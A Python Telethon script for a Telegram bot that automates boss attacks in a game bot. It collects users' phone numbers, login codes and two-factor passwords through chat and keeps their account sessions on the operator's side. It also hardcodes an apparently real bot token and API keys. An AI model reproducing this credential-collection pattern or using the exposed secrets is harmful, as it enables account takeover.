from telethon import TelegramClient, events, Button
from telethon.tl.types import Message, KeyboardButton, ChatAdminRights
from telethon.tl.functions.messages import CreateChatRequest, AddChatUserRequest, EditChatAdminRequest
from telethon.tl.functions.channels import EditAdminRequest
from telethon.errors import SessionPasswordNeededError, UserAlreadyParticipantError
import asyncio
import re

# ===== КОНФИГ =====
BOT_TOKEN = "8695263973:AAHge3QFURlz1nOJVtGmdav5HQ2NL5-RjeI"
API_ID = 25569323
API_HASH = "061bad708728d3d928054f16c932de6d"

# Список боссов
BOSSES = [
    {"emoji": "🧚", "name": "Лесная Фея"},
    {"emoji": "🧌", "name": "Гоблин"},
    {"emoji": "🦌", "name": "Дух Рощи"},
    {"emoji": "🫎", "name": "Лесной Владыка"},
    {"emoji": "👺", "name": "Тэнгу"},
    {"emoji": "🤖", "name": "Автоматон"},
    {"emoji": "🐸", "name": "Меха Жаба"},
    {"emoji": "🦂", "name": "Меха Скорпион"},
    {"emoji": "🐊", "name": "Крокодил"},
    {"emoji": "🐲", "name": "Дракон"},
    {"emoji": "🐢", "name": "Черепаха"},
    {"emoji": "🐙", "name": "Кракен"},
    {"emoji": "🦈", "name": "Глубинная Акула"},
    {"emoji": "🐳", "name": "Кит"},
    {"emoji": "🦀", "name": "Король Рифов"},
    {"emoji": "👁", "name": "Страж Портала"},
    {"emoji": "📡", "name": "Хранитель Сигнала"},
    {"emoji": "🛸", "name": "Повелитель Машин"},
    {"emoji": "🖥️", "name": "Центральный ИИ"},
    {"emoji": "🐦‍🔥", "name": "Солнечный Феникс"},
    {"emoji": "💀", "name": "Костяной Лорд"},
    {"emoji": "🧛‍♀️", "name": "Ночной Вампир"},
    {"emoji": "☠️", "name": "Король Некромантов"},
    {"emoji": "👑", "name": "Лич"},
    {"emoji": "❄️", "name": "Ледяной Элементаль"},
    {"emoji": "🌋", "name": "Лавовый Голем"},
    {"emoji": "👹", "name": "Демон"},
    {"emoji": "🦕", "name": "Зауропод"},
    {"emoji": "🐛", "name": "Меха Червь"},
    {"emoji": "👻", "name": "Призрак"},
    {"emoji": "🌩", "name": "Громовой Страж"},
    {"emoji": "🧊", "name": "Морозный Голем"}
]

# Клиент бота
bot_client = TelegramClient('bot_session', API_ID, API_HASH)

# Переменные
user_client = None
is_active = False
selected_bosses = set()
chat_id = None
chat_created = False  # Флаг создан ли чат
bot_username = "IsekaiGlobal_bot"

# Статус авторизации для каждого пользователя
auth_states = {}

# Храним код для каждого пользователя (построчно)
user_codes = {}

# ===== КЛАВИАТУРЫ =====
def get_main_keyboard():
    """Главная клавиатура снизу"""
    global is_active
    toggle_text = "❌ ВЫКЛЮЧИТЬ" if is_active else "✅ ВКЛЮЧИТЬ"
    return [
        [KeyboardButton(toggle_text)],
        [KeyboardButton("🎯 ВЫБРАТЬ БОССОВ")],
        [KeyboardButton("📊 СТАТУС БОССОВ"), KeyboardButton("🔄 ОБНОВИТЬ")]
    ]

def get_bosses_keyboard():
    """Клавиатура с боссами (4 в ряд)"""
    buttons = []
    row = []
    
    for i, boss in enumerate(BOSSES):
        icon = "✅" if i in selected_bosses else "⬜"
        row.append(KeyboardButton(f"{icon} {boss['emoji']}"))
        
        if len(row) == 4:
            buttons.append(row)
            row = []
    
    if row:
        buttons.append(row)
    
    buttons.append([KeyboardButton("🔙 НАЗАД")])
    
    return buttons

def get_code_keyboard():
    """Цифровая клавиатура для ввода кода"""
    return [
        [KeyboardButton("1️⃣"), KeyboardButton("2️⃣"), KeyboardButton("3️⃣")],
        [KeyboardButton("4️⃣"), KeyboardButton("5️⃣"), KeyboardButton("6️⃣")],
        [KeyboardButton("7️⃣"), KeyboardButton("8️⃣"), KeyboardButton("9️⃣")],
        [KeyboardButton("🔙"), KeyboardButton("0️⃣"), KeyboardButton("✅ ГОТОВО")]
    ]

# ===== ОБРАБОТЧИК СООБЩЕНИЙ =====
@bot_client.on(events.NewMessage)
async def handle_message(event):
    """Обрабатывает все сообщения"""
    if event.is_private:
        user_id = event.sender_id
        text = event.raw_text
        
        # Если это команда /start
        if text == '/start':
            await start_auth(event, user_id)
            return
        
        # Проверяем состояние авторизации
        state = auth_states.get(user_id, {})
        step = state.get('step', 'idle')
        
        if step == 'idle':
            await start_auth(event, user_id)
            
        elif step == 'phone':
            await handle_phone(event, user_id, text)
            
        elif step == 'code':
            await handle_code_input(event, user_id, text)
            
        elif step == 'password':
            await handle_password(event, user_id, text)
            
        elif step == 'done':
            await handle_main_commands(event, text)

# ===== АВТОРИЗАЦИЯ =====
async def start_auth(event, user_id):
    """Начинает процесс авторизации"""
    auth_states[user_id] = {'step': 'phone'}
    user_codes[user_id] = ""  # Очищаем код
    
    await event.respond(
        "🔐 **Добро пожаловать в охотника на боссов!**\n\n"
        "Для начала работы нужно авторизоваться.\n"
        "📱 **Отправь свой номер телефона** в формате:\n"
        "`+79991234567`",
        buttons=Button.clear()
    )

async def handle_phone(event, user_id, phone):
    """Обрабатывает номер телефона"""
    phone = re.sub(r'[\s\-\(\)]', '', phone)
    
    if not phone.startswith('+'):
        await event.respond("❌ Неверный формат! Номер должен начинаться с `+`\nПример: `+79991234567`")
        return
    
    try:
        client = TelegramClient(f'user_session_{user_id}', API_ID, API_HASH)
        await client.connect()
        await client.send_code_request(phone)
        
        auth_states[user_id] = {
            'step': 'code',
            'phone': phone,
            'client': client
        }
        user_codes[user_id] = ""  # Очищаем код
        
        await event.respond(
            f"✅ Код подтверждения отправлен на номер `{phone}`!\n\n"
            f"✏️ **Введи код**, используя кнопки ниже:\n"
            f"`{''}`",
            buttons=get_code_keyboard()
        )
        
    except Exception as e:
        await event.respond(f"❌ Ошибка: {str(e)}\nПопробуй ещё раз отправить номер.")

async def handle_code_input(event, user_id, text):
    """Обрабатывает ввод кода через клавиатуру"""
    global user_codes
    
    # Если нажали "ГОТОВО"
    if text == "✅ ГОТОВО":
        code = user_codes.get(user_id, "")
        if len(code) < 3:
            await event.respond("❌ Код должен содержать минимум 3 цифры!", buttons=get_code_keyboard())
            return
        
        # Пробуем войти с кодом
        await handle_code(event, user_id, code)
        return
    
    # Если нажали "🔙" - удаляем последнюю цифру
    if text == "🔙":
        user_codes[user_id] = user_codes.get(user_id, "")[:-1]
        current_code = user_codes.get(user_id, "")
        await event.respond(
            f"✏️ **Введи код:**\n`{current_code}`",
            buttons=get_code_keyboard()
        )
        return
    
    # Извлекаем цифру из эмодзи
    digit_map = {
        "1️⃣": "1", "2️⃣": "2", "3️⃣": "3",
        "4️⃣": "4", "5️⃣": "5", "6️⃣": "6",
        "7️⃣": "7", "8️⃣": "8", "9️⃣": "9",
        "0️⃣": "0"
    }
    
    if text in digit_map:
        user_codes[user_id] = user_codes.get(user_id, "") + digit_map[text]
        current_code = user_codes.get(user_id, "")
        await event.respond(
            f"✏️ **Введи код:**\n`{current_code}`",
            buttons=get_code_keyboard()
        )

async def handle_code(event, user_id, code):
    """Подтверждает код"""
    state = auth_states.get(user_id, {})
    client = state.get('client')
    
    if not client:
        await event.respond("❌ Ошибка! Начни заново с `/start`")
        return
    
    try:
        await client.sign_in(state['phone'], code)
        await complete_auth(event, user_id, client)
        
    except SessionPasswordNeededError:
        auth_states[user_id]['step'] = 'password'
        await event.respond(
            "🔐 **Требуется пароль двухфакторной аутентификации!**\n\n"
            "✏️ **Напиши свой пароль:**",
            buttons=Button.clear()
        )
        
    except Exception as e:
        await event.respond(f"❌ Неверный код: {str(e)}\nПопробуй ещё раз.", buttons=get_code_keyboard())

async def handle_password(event, user_id, password):
    """Обрабатывает пароль"""
    state = auth_states.get(user_id, {})
    client = state.get('client')
    
    if not client:
        await event.respond("❌ Ошибка! Начни заново с `/start`")
        return
    
    try:
        await client.sign_in(password=password)
        await complete_auth(event, user_id, client)
        
    except Exception as e:
        await event.respond(f"❌ Неверный пароль: {str(e)}\nПопробуй ещё раз.")

async def complete_auth(event, user_id, client):
    """Завершает авторизацию"""
    global user_client, chat_id, chat_created
    
    user_client = client
    me = await client.get_me()
    
    auth_states[user_id] = {
        'step': 'done',
        'phone': auth_states[user_id]['phone']
    }
    
    await event.respond(
        f"✅ **Успешный вход!** \n\n"
        f"👤 Аккаунт: {me.first_name} {me.last_name or ''}\n"
        f"📱 Номер: {auth_states[user_id]['phone']}\n"
        f"🆔 ID: {me.id}\n\n"
        f"🎮 **Открываю меню управления...**",
        buttons=get_main_keyboard()
    )
    
    # Создаём чат для мониторинга
    chat_created = await create_or_get_chat(client)
    if chat_created:
        await event.respond("✅ Чат успешно создан и настроен!")
    else:
        await event.respond("ℹ️ Чат уже существует, подключаюсь...")
    
    # Запускаем основной цикл
    asyncio.create_task(main_loop())

# ===== СОЗДАНИЕ ЧАТА =====
async def create_or_get_chat(client):
    """Создаёт чат или находит существующий"""
    global chat_id, chat_created
    
    me = await client.get_me()
    username = me.username or me.first_name
    chat_name = f"МБЛ ({username})"
    
    # Ищем существующий чат
    async for dialog in client.iter_dialogs():
        if dialog.name == chat_name:
            chat_id = dialog.id
            print(f"✅ Найден существующий чат: {chat_name} (ID: {chat_id})")
            
            # Проверяем есть ли IsekaiGlobal_bot в чате
            try:
                bot_entity = await client.get_entity(bot_username)
                await client(AddChatUserRequest(
                    chat_id=chat_id,
                    user_id=bot_entity,
                    fwd_limit=0
                ))
                print("✅ IsekaiGlobal_bot добавлен в чат")
            except UserAlreadyParticipantError:
                print("ℹ️ IsekaiGlobal_bot уже в чате")
            except Exception as e:
                print(f"⚠️ Ошибка при добавлении IsekaiGlobal_bot: {e}")
            
            # Даём админа IsekaiGlobal_bot
            await give_admin_rights(client, chat_id)
            return True
    
    # Создаём новый чат
    try:
        print(f"🔄 Создаю новый чат: {chat_name}")
        
        # Создаём чат и сразу добавляем IsekaiGlobal_bot
        result = await client(CreateChatRequest(
            users=[bot_username],
            title=chat_name
        ))
        
        chat = result.chats[0]
        chat_id = chat.id
        print(f"✅ Чат создан: {chat_name} (ID: {chat_id})")
        
        # Даём админа IsekaiGlobal_bot
        await give_admin_rights(client, chat_id)
        
        # Отправляем приветственное сообщение
        await client.send_message(chat_id, "🤖 Бот для мониторинга боссов активирован!")
        
        return True
        
    except Exception as e:
        print(f"❌ Ошибка при создании чата: {e}")
        return False

async def give_admin_rights(client, chat_id):
    """Даёт IsekaiGlobal_bot права администратора"""
    try:
        bot_entity = await client.get_entity(bot_username)
        
        # Все права администратора
        admin_rights = ChatAdminRights(
            change_info=True,
            post_messages=True,
            edit_messages=True,
            delete_messages=True,
            ban_users=True,
            invite_users=True,
            pin_messages=True,
            add_admins=True,
            anonymous=False,
            manage_call=True,
            other=True
        )
        
        # Назначаем IsekaiGlobal_bot администратором
        await client(EditChatAdminRequest(
            chat_id=chat_id,
            user_id=bot_entity,
            rights=admin_rights,
            is_admin=True
        ))
        
        print(f"✅ {bot_username} получил права администратора")
        
    except Exception as e:
        print(f"⚠️ Не удалось выдать права админа {bot_username}: {e}")

# ===== МОНИТОРИНГ БОССОВ =====
async def check_bosses():
    global is_active, selected_bosses, chat_id, user_client, chat_created
    
    if not user_client or not is_active or not selected_bosses or not chat_created:
        return
    
    try:
        # Пишем "бл" в чат
        await user_client.send_message(chat_id, "бл")
        await asyncio.sleep(2)
        
        # Получаем последние сообщения
        messages = await user_client.get_messages(chat_id, limit=10)
        
        # Ищем сообщение от IsekaiGlobal_bot с боссами
        boss_message = None
        bot_entity = await user_client.get_entity(bot_username)
        for msg in messages:
            if msg.sender_id == bot_entity.id:
                boss_message = msg.text
                break
        
        if not boss_message:
            print("⚠️ Сообщение с боссами не найдено")
            return
        
        # Парсим статусы боссов
        boss_status = {}
        for i, boss in enumerate(BOSSES):
            pattern = rf"{boss['emoji']}.*{boss['name']}.*(Жив!|\d+[мс. ]+\d*[мс.]*)"
            match = re.search(pattern, boss_message)
            if match:
                status = match.group(1)
                boss_status[i] = status == "Жив!"
        
        # Атакуем живых боссов
        for index in selected_bosses:
            if index in boss_status and boss_status[index]:
                await attack_boss(index)
                await asyncio.sleep(3)
                
    except Exception as e:
        print(f"Ошибка в check_bosses: {e}")

async def attack_boss(boss_index):
    global user_client
    
    try:
        # Пишем "бо"
        await user_client.send_message(bot_username, "бо")
        await asyncio.sleep(1)
        
        # Получаем сообщение от IsekaiGlobal_bot с кнопками
        messages = await user_client.get_messages(bot_username, limit=2)
        if not messages:
            return
        
        # Ищем кнопку по индексу
        for msg in messages:
            if msg.buttons:
                flat_buttons = [btn for row in msg.buttons for btn in row]
                if boss_index < len(flat_buttons):
                    await msg.click(boss_index)
                    print(f"⚔️ Атакуем {BOSSES[boss_index]['name']}")
                    break
    except Exception as e:
        print(f"Ошибка атаки: {e}")

# ===== ОСНОВНОЙ ЦИКЛ =====
async def main_loop():
    while True:
        await check_bosses()
        await asyncio.sleep(20)

# ===== ОБРАБОТКА КОМАНД С КЛАВИАТУРЫ =====
async def handle_main_commands(event, text):
    """Обрабатывает команды с клавиатуры"""
    global is_active, selected_bosses, chat_id, user_client, chat_created
    
    # ВКЛЮЧИТЬ/ВЫКЛЮЧИТЬ
    if text in ["✅ ВКЛЮЧИТЬ", "❌ ВЫКЛЮЧИТЬ"]:
        is_active = not is_active
        status = "🟢 ВКЛЮЧЕН" if is_active else "🔴 ВЫКЛЮЧЕН"
        await event.respond(
            f"📊 Статус: {status}\n"
            f"🎯 Выбрано боссов: {len(selected_bosses)}",
            buttons=get_main_keyboard()
        )
    
    # ВЫБРАТЬ БОССОВ
    elif text == "🎯 ВЫБРАТЬ БОССОВ":
        await event.respond(
            "🎯 **Выбери боссов для охоты:**\n"
            "✅ - выбран, ⬜ - не выбран\n\n"
            "Нажимай на кнопки чтобы выбрать/убрать босса.",
            buttons=get_bosses_keyboard()
        )
    
    # СТАТУС БОССОВ
    elif text == "📊 СТАТУС БОССОВ":
        chat_status = "✅ Создан" if chat_created else "❌ Не создан"
        await event.respond(
            f"📊 **Текущий статус:**\n"
            f"🟢 Бот: {'ВКЛЮЧЕН' if is_active else 'ВЫКЛЮЧЕН'}\n"
            f"🎯 Выбрано боссов: {len(selected_bosses)}\n"
            f"📁 Чат: {chat_status}"
        )
    
    # ОБНОВИТЬ
    elif text == "🔄 ОБНОВИТЬ":
        await event.respond("🔄 Обновляю статус...")
        await check_bosses()
        await event.respond("✅ Готово! Проверь чат МБЛ")
    
    # НАЗАД (из меню боссов)
    elif text == "🔙 НАЗАД":
        await event.respond("🔙 Возвращаюсь в главное меню", buttons=get_main_keyboard())
    
    # Выбор босса (кнопки с эмодзи)
    elif any(emoji in text for emoji in ["✅", "⬜"]):
        for i, boss in enumerate(BOSSES):
            if boss['emoji'] in text:
                if i in selected_bosses:
                    selected_bosses.remove(i)
                else:
                    selected_bosses.add(i)
                
                await event.respond(
                    f"{'✅ Выбран' if i in selected_bosses else '❌ Убран'} босс: {boss['name']}",
                    buttons=get_bosses_keyboard()
                )
                break

# ===== ЗАПУСК =====
async def main():
    print("🚀 Запуск бота-охотника...")
    await bot_client.start(bot_token=BOT_TOKEN)
    print("✅ Бот запущен! Жду авторизации...")
    
    await bot_client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())